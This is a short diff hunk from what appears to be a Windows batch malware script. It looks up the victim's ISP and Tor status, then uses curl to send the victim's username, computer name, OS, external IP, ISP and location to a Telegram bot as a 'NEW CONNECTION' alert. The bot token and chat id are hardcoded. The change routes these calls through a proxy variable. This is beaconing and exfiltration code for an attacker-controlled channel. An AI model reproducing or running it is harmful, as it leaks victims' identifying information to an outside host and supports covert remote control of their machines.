@@ -50,7 +50,7 @@ for /f "tokens=1* delims=: " %%A in (
   'curl ipinfo.io/org'
 ) Do set ISP=%%B
 for /f "tokens=1* delims=: " %%A in (
-  'curl https://iplist.cc/api 2^>NUL^|find "tor"'
+  'curl %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
 ) Do set TorStatus=%%B
 
 curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%OsName% %OsArchitecture%] [%ISP% (%ExtIP%), TOR: %TorStatus%] [%City% (%Region%, %Country%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
